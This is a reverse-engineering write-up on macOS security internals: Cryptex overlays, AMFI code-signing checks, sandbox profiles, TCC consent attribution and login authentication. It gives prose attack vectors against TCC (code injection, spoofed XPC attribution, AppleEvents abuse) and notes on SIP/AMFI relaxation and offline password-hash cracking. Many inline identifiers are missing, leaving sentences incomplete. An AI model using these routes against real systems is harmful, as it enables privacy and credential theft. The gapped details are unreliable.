The kernel overlays the RSR Cryptex on top of the base OS Cryptex using a union-style strategy:if a path exists in the RSR Cryptex, that version takes precedence;otherwise, the VFS falls back to the underlying base OS Cryptex content.The effective runtime view is:SSV  +  OS Cryptex  +  (optional) RSR Cryptex overlay
with VFS and firmlink logic ensuring a coherent  and  layout.Reversibility and Failure HandlingRSRs are designed to be reversible:
Boot policy ensures the system is either fully in “base OS” state or in “base OS + specific RSR overlay” state. Partial application is not supported.
If repeated boots under a given RSR Cryptex fail (for example, due to a regression), the boot chain can mark that RSR as inactive and revert to the base OS Cryptex on subsequent boots, without modifying the SSV.Security and RE Implications
Because Cryptexes and their trust caches are verified via Image4 and TXM, replaying older Cryptexes or RSRs is constrained by the same personalization and policy rules as the base OS.
RSRs live outside the SSV (typically on Preboot), but they remain in the verified boot chain via their manifests and trust caches.
To understand an RSR, you extract the RSR Cryptex image from the update payload, mount it, and diff its contents against the base OS Cryptex. The semantic delta is “what the RSR changed.” The live system view is the union of SSV + base OS Cryptex + any active RSR overlays, subject to SPTM/TXM integrity constraints.9.0 The Security Daemon HierarchyWhile the kernel and the hardware monitors (SPTM/TXM) enforce the immutable laws of the system physics (memory protections, page table integrity, executable mappings), the complex, mutable business logic of macOS security is delegated to a hierarchy of userland daemons. These daemons operate with high privileges, often holding special ports or entitlements that allow them to influence kernel policy. For the reverse engineer, these daemons represent the “Policy Engine” of the OS—and historically, the most fertile ground for logic bugs and sandbox escapes.9.1  (Apple Mobile File Integrity Daemon)The Apple Mobile File Integrity Daemon () is the userland arbiter of code execution policy. While the  enforces code-execution policy and manages trust caches for platform binaries in the guarded world, it lacks the context to evaluate the complex web of third-party provisioning profiles, developer certificates, notarization state, and MDM constraints.In the Tahoe architecture,  functions as the Policy Decision Point (PDP) for non-platform code, while the kernel and TXM act as the Policy Enforcement Points (PEP) that ultimately decide whether pages become executable.9.1.1 The Interaction between , the Kernel (MACF), and  does not poll for binaries; it is driven by the kernel via the Mandatory Access Control Framework (MACF) hooks in the AMFI/AppleMobileFileIntegrity path. is a critical system daemon launched by  early in the boot process. Because  is responsible for verifying signatures, it presents a bootstrap paradox:  is a platform binary shipped as part of the system OS (delivered via the Signed System Volume and associated cryptexes). Its  is included in the  that iBoot hands to the kernel during early boot. When  spawns , the kernel’s AMFI path consults TXM against the static trust cache. The CDHash is present, so the secure-world policy engine blesses the mapping immediately. No userland upcall is required for  itself.From this point onward,  becomes part of the trusted computing base: it is the userland process that encodes code-execution  for everything that is  already covered by immutable trust caches.The Verification Upcall (The “Slow Path”)When a user launches a third-party application (for example, /Applications/Calculator.app), the flow traverses the boundary between kernel and userland multiple times.The kernel executes . Along the AMFI path, the MACF hook mpo_vnode_check_signature in  is triggered. This hook is the choke point where the system decides whether the binary’s code signature is acceptable.The kernel (via AMFI) queries TXM in the guarded world (conceptually via an internal “GENTER”-style call). TXM consults the  and the .For a newly launched, third-party app whose CDHash has never been seen before, this lookup fails: there is no matching entry in either cache.On a trust-cache miss, the kernel must delegate policy to userland. It constructs a Mach message targeting the  (host special port 18), which is bound to .A send right to a  for the executable.Metadata describing offsets and sizes (location of the code signature blob, file length, etc.).The CDHash or code directory parameters needed for verification.Exact field layouts vary by OS release, but the kernel avoids trusting raw string paths where possible and instead relies on fileports and offsets. receives the MACH IPC and performs the heavy lifting:Parses the  / code signature blob from the file.Validates the certificate chain via  (Mobile Installation Service) and often IPC to .Extracts  and, if present, an embedded  ().Applies policy derived from Developer Mode, MDM profiles, and local configuration. responds to the kernel with a MIG reply corresponding to the  routine. For the kernel, this effectively collapses to:A status code (success, profile mismatch, expired certificate, etc.).Derived flags (e.g. whether  is permitted).Optionally, additional hints for AMFI.At this stage, the kernel updates the process’s  (Code Signing Flags), including bits such as  and , based on ’s verdict.If  approves the binary, the kernel performs a second secure-world interaction: the CDHash and relevant metadata are added to the  managed under TXM’s control. Future launches of the same, unchanged binary can now be satisfied entirely in TXM and AMFI without repeating the upcall. In Tahoe, the architecture is such that TXM remains the final authority on . Even if the kernel or  were compromised, adding a CDHash to the dynamic trust cache requires passing TXM’s guardrails.  supplies the  decision (“this developer identity / profile is acceptable here”), while TXM ensures that the code bytes actually match the identity being whitelisted.RE Focus: The MIG InterfaceThe communication interface is defined in the (reverse-engineered) MIG definition usually referred to as . The key routine is often named . for the caller (kernel), , offset and size parameters for the code signature, and flags controlling the verification mode. Historically, malformed Mach messages to ’s service port produced classic parsing bugs. Modern macOS hardens this by:
Validating the  to ensure calls originate from , not arbitrary userland.Tightening the MIG server and argument validation paths.Relying increasingly on fileports rather than untrusted string paths.For reverse engineers, the MIG stubs and their error-handling paths remain prime targets for logic bugs and subtle policy bypasses.9.1.2 Validating Code Directories (CDHash), Entitlements, and Provisioning ProfilesThe core logic of  resides in its ability to connect a binary’s  to a valid  and, when applicable, a . This mechanism enforces both the iOS-style “Walled Garden” and the macOS notarization regime.The Validation Logic (MISValidateSignatureAndCopyInfo) links against , which exports the symbol MISValidateSignatureAndCopyInfo. This function encapsulates most of the signature and profile evaluation: reads the  load command, locates the , and computes the  by hashing the slots specified by the Code Directory (typically a truncated SHA-256 or SHA-1, depending on platform and epoch).It parses the embedded entitlements plist from the signature blob. These entitlements express requested capabilities (e.g. com.apple.security.network.client, com.apple.security.get-task-allow, private IOKit entitlements).Profile Correlation (Developer-Signed Binaries)When the binary is signed by a non-Apple certificate:It looks for an embedded provisioning profile ().It verifies the  signature of the profile, ensuring it is issued by Apple.It compares the entitlements in the binary against the  dictionary in the profile, enforcing that the binary does not claim more than the profile grants.For development profiles, it verifies that the device’s identifier (UDID / platform identifier) is present in the  array (or matches the profile’s “All Devices” semantics, depending on platform). Certain entitlements (for example, com.apple.private.security.no-sandbox, low-level IOKit and CSR overrides) are “restricted” and only grantable when the signature chain terminates in specific Apple internal CAs or special program certificates. enforces this hierarchy by refusing binaries whose entitlements exceed what the provisioning profile and certificate chain permit.The “Union” of Trust: Notarization and GatekeeperOn macOS, this signature evaluation interacts with the  system, primarily implemented in :At download or first execution,  and  evaluate notarization tickets (stapled to the binary or stored under ) and decide whether the binary is admissible under current policy.Once a binary is admitted, subsequent executions still traverse AMFI/:
 ensures that the running code’s signature and entitlements still match what was originally notarized.It can treat notarized binaries as belonging to a higher trust tier compared to purely ad-hoc signatures (for example, relaxing some heuristics or additional scanning).The effective trust decision is thus the intersection of:Static trust caches and TXM policy (platform code).Gatekeeper / notarization (admission control for untrusted downloads). (per-execution verification and entitlement policy).RE Focus:  Reversing is heavily stripped and obfuscated, but it has a simple, observable contract:MISValidateSignatureAndCopyInfo returns an integer status, where  indicates success and non-zero error codes map to specific failures (profile expired, certificate invalid, entitlements mismatch, etc.). logs detailed failure reasons via  and friends. Many of these logs are visible only with specific boot arguments or developer configurations (for example, AMFI developer mode toggles).Instrumenting the call sites and enumerating non-zero return codes is often the most efficient way to understand why a given binary is being killed or stripped of capabilities.9.1.3 Exception Handling: How  and Debugging Entitlements are ProcessedOne of ’s most security-sensitive roles is gating access to process debugging. The ability to attach a debugger () is effectively a full compromise of the target process.The  EntitlementIn a standard production configuration, a process cannot be debugged unless either:The system is in a special developer or recovery mode, The target process possesses the com.apple.security.get-task-allow entitlement and other policy conditions are satisfied. When an app is built and run from Xcode, the build system signs it with a development certificate and injects , allowing / to obtain a task port. The App Store distribution pipeline strips  before submission; resulting binaries are non-debuggable under normal policy.During , the kernel extracts entitlements and passes them (directly or indirectly) into the AMFI/ path: validates that  appears in both:
The entitlements blob in the code signature.The entitlements and capabilities granted by the provisioning profile / certificate chain. indicates that  may be set in the process’s . Subsequent  checks can succeed (subject to further checks like caller UID, SIP bits, and TCC state).Invalid or Over-Privileged: can cause the entitlement to be ignored or the entire signature to be rejected, leading to kill-on-launch or a process without debug permissions.When  or  calls :The kernel checks the target’s  (including ) and applies additional policy (root privileges, SIP bits such as , and TCC automations).If the flags and policy allow it, the caller receives a send right to the target’s task port; otherwise, the call fails (e.g.  / ).Developer Mode (The Tahoe Shift)In the Tahoe architecture, the presence of  and a development certificate is no longer sufficient by itself. Debuggability is additionally gated by :Developer Mode state is maintained by  and enforced via SPTM/TXM. The AMFI/ path consults this state (via private interfaces and entitlements) when evaluating signatures.If Developer Mode is :Binaries signed solely with development certificates are generally treated as untrusted for execution and debugging on end-user systems.Even if the provisioning profile is otherwise valid,  and associated policy may refuse to honour , resulting in  that do not permit .This prevents the trivial side-loading of a “debuggable” app to inspect memory on a locked-down device; enabling Developer Mode requires an explicit, TXM-mediated ceremony that materially lowers the device’s security posture.Unrestricted Debugging, SIP, and AMFIOn macOS, System Integrity Protection (SIP) and  are distinct but interacting mechanisms: SIP is configured via  and boot arguments, setting bits such as  (relaxing debugging restrictions), CSR_ALLOW_UNRESTRICTED_FS, and others.AMFI / : On internal or development builds, AMFI can be disabled or relaxed via boot-args (e.g. ), effectively causing the kernel to bypass code-signing enforcement.Setting debug CSR bits like  allowed broader debugging of system processes, but  by itself disable AMFI’s signature checks.Disabling AMFI () is what effectively causes the kernel to treat code signatures as trivially acceptable.SIP state is one of the inputs into , with TXM enforcing the resulting policy at the page-table and executable-mapping level.AMFI and  still perform signature and entitlement checks, but some CSR bits continue to relax specific restrictions (for example, attaching a debugger to processes that would otherwise be non-debuggable).Fully “everything is valid” behaviour is reserved for tightly controlled developer or internal configurations and is not reachable on production systems without both SIP and AMFI being simultaneously subverted.9.2  & The Seatbelt PolicyIf  is the bouncer checking identities at the door, the  subsystem (marketed as App Sandbox) is the straightjacket applied once code is inside. Originating from TrustedBSD, the macOS sandbox is a Mandatory Access Control (MAC) mechanism that restricts a process’s access to resources—files, sockets, Mach ports, IOKit drivers—regardless of the user’s UID.In the Tahoe architecture, the sandbox has evolved from a predominantly path-based filter into a semantic, metadata-driven enforcement layer, tightly coupled with the kernel’s VFS and process credential machinery and integrated with new  primitives.Sandbox profiles are expressed in SBPL (Sandbox Policy Language), a Scheme-like (LISP) dialect. The kernel does  interpret SBPL directly. Instead, policy is compiled into a compact bytecode format that the kernel executes.The SBPL compiler lives primarily in  (and its libsystem glue), not in .Depending on the process, different profiles are selected: The system applies a generic  profile that implements the standard app sandbox. Daemons specify their profile name in their  (for example, ), which is resolved to an SBPL specification. In modern macOS, many core policies are consolidated into a  bundled with  / the Boot Kernel Collection. Individual SBPL files for system services still exist, but the trend is toward more policy being pre-compiled into the kernel cache to reduce runtime parsing and external configuration surface.The Compiler ( / )When a process initializes the sandbox (for example, via sandbox_init_with_parameters):The call enters  in the process address space. parses the SBPL (often using an embedded TinyScheme derivative).It resolves variable expansions such as , , and environment-dependent paths.It compiles the SBPL rules into a proprietary  representation. is not on this critical path. Its primary role is to receive violation reports and log denied operations; it is not the SBPL compiler.The compiled blob is a serialized decision machine: Operations such as “match path”, “match pattern”, “check entitlement”, “allow”, “deny”, and conditional branching. Rules are arranged into decision trees or tries keyed by operation class and path prefix (for example, file operations grouped under , ).This bytecode is opaque to userland: it is handed to the kernel via the  / sandbox-specific syscalls, where  attaches it to the process’s MAC label.RE Focus: Reversing the Binary BlobThe kernel receives the compiled profile via a MACF-specific syscall (e.g.  with ): The blob can be captured by:
Hooking  /  inside .Hooking  /  at the userland boundary.Extracting the label attached to the process in the kernel ( → sandbox label). Tools such as  (Sandbox Scrutinizer) or custom disassemblers lift the bytecode back into an SBPL-like intermediate representation. In Tahoe, the kernel performs sanity checks on the bytecode (bounds checks, instruction validity, loop constraints) before attaching it to a process. This reduces the risk that a malformed profile can hang or crash kernel threads.9.2.2 The Sandbox Kernel Extension: Hooking Syscalls via the MAC FrameworkThe enforcement engine is , which hooks into the XNU kernel via the Mandatory Access Control Framework (MACF).XNU is instrumented with a large set of  hooks placed at security-critical bottlenecks:, , , etc., mac_mach_port_check_receive., mac_iokit_check_get_property. registers a  via a  structure whose function pointers implement these hooks.A sandboxed process issues a syscall, for example:open("/etc/passwd", O_RDONLY);The kernel executes . MACF dispatches this call to all registered policies, including .Looks up the process’s .Retrieves the , which includes a pointer to the compiled profile bytecode.Normalizes arguments (operation kind, path, vnode type, etc.) into a canonical form.The sandbox engine executes the profile bytecode: Operation (for example, ), resource (path ), additional attributes (file type, vnode flags). Traverses the pre-compiled decision tree, checking path prefixes, patterns, and entitlements.Caching (Performance Critical Path)Evaluating bytecode on every syscall would be prohibitively expensive, so  maintains caches:Per-vnode caches: Attach allow/deny decisions to vnode labels once a decision has been made.Per-process caches: Cache repeated deny decisions for patterns known to be disallowed.Subsequent accesses to the same file or resource often bypass the full bytecode interpreter and reuse cached verdicts. Bugs in cache invalidation (for example, renames, mount points, or attribute changes that fail to invalidate cached decisions) can lead to enforcement bypasses where the sandbox decision no longer reflects reality.The Tahoe / SPTM IntersectionWhile sandbox policy is defined in software, the integrity of the enforcement hooks is backed by hardware:The  structures and many related function pointer tables reside in  segments (/) in the Boot Kernel Collection. enforce invariants on the kernel’s page tables, preventing EL1 code from remapping those const segments as writable, even under a kernel write primitive.This has two consequences:Classical rootkits that “unhook” sandbox enforcement by overwriting function pointers in  are blocked at the page-table level: the attempted store either faults or writes to a non-effective alias.The sandbox policy can still be subverted through more subtle means (policy loading, profile compilation, credential forgery), but transparent pointer overwrites of core hooks are no longer a viable attack on Tahoe-class hardware.9.2.3 Containerization: Data Vaults and Group ContainersIn the Tahoe era, Apple has moved beyond simple path-based rules (fragile and prone to symlink and mountpoint attacks) toward semantic containerization of data.Data Vaults are used to protect the most sensitive data at rest—for example, Messages, Photos, and certain system databases. A Data Vault is typically a directory or volume flagged with specific VFS attributes (for example, the “datavault” flag and associated extended attributes).Access decisions are made in MAC hooks  classic Discretionary Access Control (DAC). Even  (UID 0) cannot trivially  or  a Data Vault.Access is granted only if the calling process holds specific, private entitlements (for example, com.apple.private.security.storage.AppDataVault or service-specific variants). Running as  with  is no longer sufficient. Data Vault checks are keyed off entitlements and sandbox state, not UID. Kernel symbols such as rootless_check_datavault_flag and related helpers encode these checks. Reversing them reveals:How Data Vault flags are stored in the vnode and mount structures.Which entitlements are accepted for a given vault class.To support IPC and data sharing between apps and their extensions (for example, a Widget and its host app), the sandbox introduces .The  Entitlement: Declares group IDs such as . These IDs define shared container namespaces. The system daemon  manages the lifecycle and filesystem layout of these group directories (typically under ~/Library/Group Containers/).When compiling the app’s sandbox profile,  inspects entitlements.For each  identifier, it injects rules that allow controlled read/write access to ${HOME}/Library/Group Containers/<group-id>.This binds filesystem access directly to the cryptographic identity of the executable: only code signed with a matching App Group entitlement can enter that directory.For the reverse engineer, group containers provide a clear mapping from entitlements → filesystem layout; group container IDs found in entitlements can be used to locate shared state and attack surfaces.9.3  (Transparency, Consent, and Control)If  validates code identity and /Seatbelt constrain code reach,  governs the most volatile part of the security model: .The Transparency, Consent, and Control (TCC) subsystem is effectively a “User Intent Oracle”. It governs access to privacy-sensitive sensors (Camera, Microphone), personal data (Contacts, Calendars, Photos), and privileged capabilities (Full Disk Access, Screen Recording). In the Tahoe architecture,  has evolved from a simple “prompt and remember” component into a complex attribution engine that must defend against consent hijacking and attribution spoofing.9.3.1 The TCC Database: Schema, Integrity, and SIPTCC persists user consent state in SQLite databases. There is a split between system-wide and per-user state:/Library/Application Support/com.apple.TCC/TCC.db — root-owned, stores system-wide decisions such as Full Disk Access.~/Library/Application Support/com.apple.TCC/TCC.db — user-owned, stores per-user decisions such as Camera/Microphone access.The core table is . For reverse engineering, key columns include: Identifies the privilege (e.g. kTCCServiceSystemPolicyAllFiles, , ). The bundle identifier or absolute path of the client. Indicates whether  is interpreted as a bundle ID () or path (). Encodes the decision (e.g.  = Denied,  = Unknown / Prompt,  = Allowed,  = Limited). A compiled Code Signing Requirement (CSReq) used to bind the decision to a particular identity, not just a path string.Additional columns (timestamps, indirect attribution fields, categories) vary by OS release, but these fields form the stable core.The  Blob: Cryptographic AnchorTCC does  trust filesystem paths alone. Instead:When a request arrives,  obtains the process’s code signing information (via  or similar APIs).It evaluates whether the  satisfies the stored  expression from the database row:(Current_Code_Signature) satisfies (Stored_CSReq)
If the check fails (for example, the app was re-signed with a different certificate), existing permissions do not apply, and a new prompt may be triggered or access denied.This prevents an attacker from overwriting /Applications/TrustedApp.app with malware and inheriting its camera or disk permissions.Although the TCC databases are ordinary SQLite files, access to them is tightly controlled: The system TCC database is protected by SIP; direct modifications are blocked for all but a handful of Apple-signed components with special entitlements (including  itself). On newer macOS versions, the directory containing TCC databases can be part of a , requiring specific entitlements just to traverse or open the directory and files.Exclusive Control by : maintains long-lived connections and can hold locks on the database.Attempts to modify the file on disk directly (for example, via  under a disabled SIP configuration) often lead to integrity check failures, after which  may restore the database from a backup or recover via WAL semantics.RE Focus: The  FallacyThe  command-line utility behaves as a client of TCC, not a raw database editor:It communicates with  via XPC to request resets or clears.It does not write to  directly.Observing XPC traffic between  and  yields the supported operations and their internal names.Direct tampering with  is fragile and often counterproductive; intercepting or simulating ’s own XPC interfaces is more robust.9.3.2 The Attribution Chain: Determining  Is AskingThe hardest problem TCC solves is . When an action flows through multiple processes, which one should be considered the “client” for consent purposes?A GUI app that launches a helper tool to touch the camera.A terminal running a shell script that launches  or a Python interpreter.A background agent performing work on behalf of a signed, user-facing app.When a message arrives at  (for example, over  or ):The Mach message carries an  in its trailer. extracts PID, UID, GID, and audit attributes from this token.It uses the kernel’s code-signing interfaces (,  flags) to resolve the token to an actual, signed binary on disk.The audit token is provided by the kernel and cannot be forged by userland, making it the primary identity anchor.The “Responsible Process” ProblemAttribution is not always identical to the immediate caller:For  running , the  entity for a network or disk access may be considered , not .For automation or helper tools, a background daemon might act on behalf of a user-facing app.To handle this, TCC models an : and Relationship TrackingLaunch services, XPC, and higher-level frameworks can mark another process as the “responsible” one (for example, via launch configuration or XPC flags). verifies that the relationship between caller and responsible process is legitimate (parent–child, session, or entitlement-based).Access Object ConstructionInternally,  constructs a conceptual : The process issuing the request (the immediate caller). The process that will actually interact with the resource (often equal to the subject). The process that should be presented to the user in UI and used as the key in the database.If the caller has a private entitlement such as com.apple.private.tcc.allow for the requested service, access is granted without user interaction.Otherwise, TCC looks for an existing row in  for the attributor and service (using  matching).If no row exists,  triggers a user prompt.TCC prompts are not drawn by the requesting client: delegates UI to system agents such as  / .Prompts are shown in elevated WindowServer layers that the client cannot fully control or overlay, mitigating clickjacking and fake consent dialogs.9.3.3 RE Focus: XPC Attacks against TCC Endpoint ValidationFrom a vulnerability research perspective,  is a high-value target. Gaining the ability to impersonate a trusted client (such as ) can yield Full Disk Access or other sensitive capabilities.Attack Vector 1: XPC Injection into Trusted ClientsMany TCC-permitted apps are extensible:They load bundles or plugins via .They may allow scripting or untrusted content with code execution.If an attacker injects code into such a process:That code runs  the trusted PID.TCC continues to see the trusted app’s identity and grants access based on its existing permissions. and  (enforced by AMFI and  in cooperation with TXM) prevent loading unsigned or unentitled libraries into hardened processes.However, any app with com.apple.security.cs.disable-library-validation or similar entitlements remains a potential carrier for this class of attack.Attack Vector 2: Fake Attributors and XPC Payload SpoofingEarlier macOS versions were more trusting of client-supplied metadata in XPC messages:Some TCC code paths accepted an explicit “target token” or attribution fields from the client’s XPC dictionary.Attackers could attempt to supply a forged  that pointed to a more privileged app.Modern TCC has hardened this:For most services,  ignores user-provided tokens in XPC payloads.It trusts only the kernel-supplied audit token from the Mach message trailer and reconstructs attribution from kernel state and entitlement checks.Attack Vector 3: Semantic Confusion via Automation (AppleEvents, , etc.)An attacker can attempt to coerce a privileged app into performing an action:For example, using AppleEvents or the  command to cause  or another privileged app to run a script or open a sensitive file.If the privileged app is the attributor in TCC’s view, its permissions are leveraged by the attacker’s payload. such as  gate which apps can send AppleEvents to which targets. tracks automation relationships and often requires separate consent for one app to control another.The Tahoe Impact: Hardware-Anchored IdentityOn Apple Silicon with Tahoe-class hardware:TCC depends on code-signing identity and hardened runtime flags obtained from the kernel.Those, in turn, are anchored in TXM and SPTM:TXM controls executable mappings and trust caches.SPTM enforces that the kernel’s view of code identity cannot be arbitrarily rewritten via page-table manipulation.A kernel attacker who sets  bits in process credentials without correspondingly convincing TXM risks creating a state where pages will not be executable or are killed on use.TCC’s reliance on code identity is therefore backed by a hardware root of trust: subtly altering TCC decisions still requires either:Subverting ’s logic (via XPC or parsing bugs), orSubverting the TXM/SPTM path that defines which CDHashes are trustworthy.Even under kernel compromise, forging the identity of a high-value system binary that TCC trusts is significantly more complex than on pre-SPTM systems; the identity must be consistent from the userland view, the kernel’s credentials, and the secure-world trust caches.10.0 User Session, Authentication & Data ProtectionThe transition from the system bootstrap phase to the interactive user session represents a critical boundary crossing. Up to this point, the system has operated primarily in the  domain, managed by the root  context. The instantiation of a user session requires the creation of a new security context—the —and the decryption of user-specific cryptographic material anchored in the Secure Enclave.In the Tahoe architecture, this process is no longer a simple comparison of a password hash against a file. It is a hardware-mediated ceremony involving:Evaluation of the user’s credentials via  and the  store.Unlocking of a SEP-protected per-user secret that underpins the  / FileVault authorization model.Derivation or unwrapping of the  inside the SEP.Establishment of a local Kerberos identity (via the Local KDC / LKDC) for those services that participate in single sign-on, with the initial credentials ultimately rooted in secrets that are only accessible after the SEP has accepted the login.Biometrics (Touch ID, Face ID, Optic ID) do not replace the password; they conditionally authorize the Secure Enclave to perform cryptographic operations—such as unwrapping key material—that would otherwise require manual secret entry.10.1  & The graphical login experience is orchestrated by two primary userland components: – Manages the session lifecycle and login UI, coordinates shield windows, and drives the state machine for login / logout / fast user switching. – Provides the abstraction layer for authentication and identity services, loading plugins to speak to local, LDAP, and Active Directory nodes.Both components have lineage back to NeXTSTEP, but their internals have been aggressively refactored to support the hardware-backed security model of Apple Silicon and the Tahoe boot chain.10.1.1 The Audit Session ID (ASID) and Kernel TrackingIn XNU, the concept of a “User” in the sense of a  is tracked via the . This is distinct from the UNIX UID/GID: – Identify principals in the traditional POSIX sense. – Identifies a specific authenticated session (e.g. physical console login, fast user switch slot, SSH login, screen sharing session).Every process in the system carries an  which encodes, among other fields, the ASID of the session under which it is running.When  successfully authenticates a user, it does not simply . It calls into the BSM audit stack via the  syscall (typically through  wrappers): The syscall populates the  state, from which  values are derived for that process. Children inherit their parent’s ASID in much the same way they inherit UID/GID. Changing an ASID after it has been established is tightly controlled. In practice, only a small set of privileged components (e.g. , ) can create or reassign audit sessions, and they do so under private entitlements discovered via reverse engineering rather than public API.For almost all processes, the ASID behaves as a write-once attribute: it is set when the session is created and then propagated down the process tree.ASID as a Console Ownership signalThe ASID acts as a primary signal for “Console Ownership” in several subsystems:
Access-control decisions for sensors such as Camera and Microphone are made in the context of an audit token. When a process requests, for example, Camera access,  evaluates whether the request comes from the ASID associated with the active graphical console. Foreground sessions see prompts; non-console sessions (e.g. SSH) are generally denied or handled differently.
Only processes that belong to the active console ASID are permitted to establish the full, interactive connection to the WindowServer required to draw on the screen. Other ASIDs may be confined to offscreen rendering, remote sessions, or be blocked entirely.This makes the ASID a crucial anchor for reasoning about which processes are “actually in front of the user” in the Tahoe user-session model.RE Focus:  and launchd domainsHistorically, the transition from the  context (running as root) to the user context involved a setuid helper binary, , which mediated the handoff of credentials and environment to a per-user  process. That design existed in earlier OS X releases, where each logged-in user had their own  instance.Modern macOS (including Tahoe) uses a different model:There is a single  process (PID 1) for the entire system.Instead of spawning separate  processes per user,  manages multiple  in its bootstrap namespace:A  for LaunchDaemons. keyed by UID (e.g. ). keyed by ASID (e.g.  or ).GUI domains (e.g. ) that correspond to interactive consoles.On successful authentication,  now:Uses private XPC/session APIs (e.g.  and related calls, as observed via reverse engineering) to ask the  to create or activate:A  for the authenticated UID.A  keyed by the newly established ASID.Binds that login domain to the new Audit Session:New user processes launched for the session are started in this login domain.Their  values reflect both the user’s UID and the new ASID.The  in  becomes the  of the user’s process tree for that session (services, agents, apps), but:All of these processes are still ultimately descendants of the .There is no separate “User ” process in modern macOS; only per-user/per-session  inside the global .For reverse engineers, the key observation points are:Tracking how  transitions from “no session” to “new ASID + new login domain”.Enumerating  jobs in the relevant  and  namespaces to reconstruct the user’s process lattice for a given ASID.10.1.2 : The Shield Window and Session State (at /System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow) is the session leader for the console. It:Draws the login UI and lock screen.Negotiates authentication with  and Kerberos components.Manages fast user switching and logout.Maintains the “Shield Window” that sits above all userland UI during sensitive phases.The Shield Window (anti-overlay)To prevent “fake login” and clickjacking attacks in which a malicious application draws a visually perfect imitation of the login screen to steal credentials,  uses a privileged connection to  (the WindowServer framework): The login UI is drawn at or near , a reserved Z-order used by the system for modalities like login, lock, and screen dimming overlays. While the Shield Window is active, the WindowServer routes all keyboard and pointer events exclusively to . Background applications may still be composited but do not receive input, even if their windows visually overlap or mimic the login UI. The Shield Window is tied to the active console ASID, so remote or background sessions cannot legitimately persist a shield that captures events intended for the physical user.For RE work, confirming input exclusivity via event taps is a good sanity check that the shielded state is active. implements a substantial state machine driven by: Legacy IPC paths that still orchestrate parts of the login / logout choreography and client notifications.Darwin Notifications / XPC: Modern notification mechanisms for coordinating with , , and system services.
While officially deprecated, the underlying code paths remain. They are surrounded by modern sandboxing and hardened runtime checks, but they still provide observable transitions around session start / end.Session state persistence:Resume / Transparent App Lifecycle (TAL): participates in the “Resume” feature (re-opening windows after reboot or logout). State is persisted across:Per-host preferences such as ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist.Per-application saved state under ~/Library/Saved Application State/.These artifacts are protected by the user’s Data Protection keys and provide a rich post-mortem surface for reconstructing session evolution.10.1.3 : The Authentication Broker is the daemon responsible for answering the question: “Are these credentials valid for this identity?” It is a modular daemon that loads plugins (bundles) to handle different directory services: local, LDAP, Active Directory, and more.The Local Node ()On a standalone Mac, authentication is handled by the , whose data store lives under:/var/db/dslocal/nodes/Default/ are stored as individual property list () files under .These plists contain metadata (name, UID, group memberships, secure token flags, etc.) but not directly the password hash.The actual password verifier is stored as  data:The user plist typically contains a  key whose value is a binary blob.Analysis of these blobs shows:A  representation of the password for compatibility with older flows and offline verification scenarios.Additional structured fields used by Apple’s modern authentication path, including material that is only meaningful in combination with the Secure Enclave and device-specific secrets.In the Tahoe-era architecture, it is useful to conceptually treat part of this blob as a SEP-wrapped per-user secret that participates in FileVault and keybag unlock. Apple does not publish the internal structure of , but reverse engineering strongly indicates that the blob contains more than a conventional hash.Verification Flow ()When  submits a password to  for a local account, the flow roughly looks like this: uses its Local Node plugin to locate the user record and retrieve the associated  blob.
The SALTED-SHA512-PBKDF2 component can be verified locally to confidently reject obviously wrong passwords without involving the SEP.Secure Enclave mediation:
For FileVault-enabled accounts and for modern secure-token flows,  (via lower layers in the stack) invokes the  interface in the kernel:The candidate password and the relevant wrapped secret(s) derived from  are marshalled to the kernel.The kernel forwards this to the SEP over the mailbox channel.The device’s  (fused in hardware, never leaving the SEP).A KDF over the password and salt.Policy- and measurement-dependent state (e.g. SKP).The SEP attempts to “unwrap” the per-user secret and, if successful, signals success and may derive additional keys for keybag and FileVault operations. treats SEP success as authoritative for those modern flows. A failure at this stage typically manifests as an authentication error even if the legacy PBKDF2 hash alone would have been satisfied.This architecture has two important consequences:Password hashes vs. device-bound keys:
Extracting  allows offline cracking of the PBKDF2-SHA512 password hash, but recovering the password does  by itself reconstruct the FileVault Volume Encryption Key (VEK) or class keys. Those require the SEP, UID key, and SKP-bound material.
The secrets that actually unlock user data are bound to the specific Secure Enclave instance that created them. Moving Shadow Hash material to another Mac does not make that user’s FileVault-protected data decryptable without further compromise.From a red-team perspective, this forces attacks toward live credential interception (before the password is sent into the verification pipeline) or SEP compromise, rather than traditional offline hash cracking for disk decryption.10.1.4 Kerberos and the Local KDC (Heimdal)Modern macOS systems ship with a  stack and, by default, support a Local Key Distribution Center (LKDC). The LKDC provides Kerberized identities for local services and is integrated with Open Directory.Why Kerberos on a standalone Mac?Kerberos avoids passing plaintext passwords around systemwide. Instead:Initial login (when Kerberos is configured):
Once the user’s credentials have been accepted (potentially via SEP-mediated verification), the system can obtain a Ticket Granting Ticket (TGT) from the LKDC corresponding to that account. This step is conditional: non-Kerberized setups or purely local workflows may omit it.
Kerberos tickets are stored in a credential cache managed by the system (kernel and userland helpers), typically accessed via the standard  / CCAPI plumbing.
When the user interacts with Kerberized services (e.g. Screen Sharing, some system preference panes, local file services, AD-backed services), the client obtains a  from the LKDC and presents it to the target service instead of resending the password.
Services validate the Kerberos ticket and enforce their own authorization logic.In higher-assurance environments:Smart cards or platform PIV tokens (backed by the Secure Enclave) are used instead of passwords.Kerberos uses  to validate an X.509 certificate chain, mapping it to a Kerberos principal.Tahoe’s hardened boot and driver model ensures that:The smart card driver stack (often running as a driver extension, ) is validated and measured under TXM/LocalPolicy.Certificates and private keys used for PKINIT are only accessible after SEP policy checks.RE Focus: The private  contains the glue between , , and the Kerberos stack:Functions like krb5_get_init_creds_password remain useful RE chokepoints for observing when and how plaintext credentials are turned into Kerberos tickets.Hooking these paths requires bypassing SIP and the hardened runtime and is therefore squarely in the “post-exploitation / lab” category rather than a practical on-disk modification target.10.2 Biometric Unlock (Touch ID / Face ID / Optic ID)Biometric authentication on Apple platforms is frequently misunderstood as a replacement for the passcode or password. Architecturally, it is a :Biometrics never replace the underlying secret; they authorize the Secure Enclave to perform a cryptographic operation that would otherwise require manual entry of that secret.The SEP decides whether biometric factors are currently acceptable (policy, backoff, recent passcode use, secure intent).On success, the SEP unlocks or derives specific keys and returns opaque handles or tokens to the OS.In the Tahoe architecture, the biometric stack is an interplay between:Userland daemons (, ).Kernel drivers (, Local Authentication hooks).For Face ID and Optic ID: the Secure Neural Engine (SNE).10.2.1 The Daemon Hierarchy:  →  → SEPThe implementation is split across two main daemons to enforce separation of concerns:
Located at/System/Library/Frameworks/LocalAuthentication.framework/Support/coreauthd,
